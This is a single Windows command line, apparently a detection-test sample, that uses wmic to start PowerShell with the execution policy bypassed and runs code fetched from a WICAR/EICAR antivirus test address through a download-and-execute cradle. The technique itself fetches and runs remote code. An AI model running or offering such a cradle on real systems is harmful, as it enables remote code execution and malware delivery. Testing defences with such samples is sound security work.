wmic process call create "powershell -NoP -Ep Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://malware.wicar.org/data/eicar.com')"
